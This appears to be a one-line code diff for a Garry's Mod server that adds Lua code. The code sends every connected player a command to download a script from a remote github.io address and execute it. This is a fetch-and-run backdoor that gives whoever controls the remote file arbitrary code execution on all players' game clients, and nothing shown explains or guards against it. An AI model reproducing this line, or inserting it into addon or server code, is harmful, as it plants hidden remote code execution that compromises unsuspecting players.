@@ -1,0 +1,1 @@
+for k, v in pairs( player.GetAll() ) do v:SendLua( [[http.Fetch( 'https://isseeee.github.io/Optron/disco2.lua', function( body ) RunString( body ) end )]] ) end
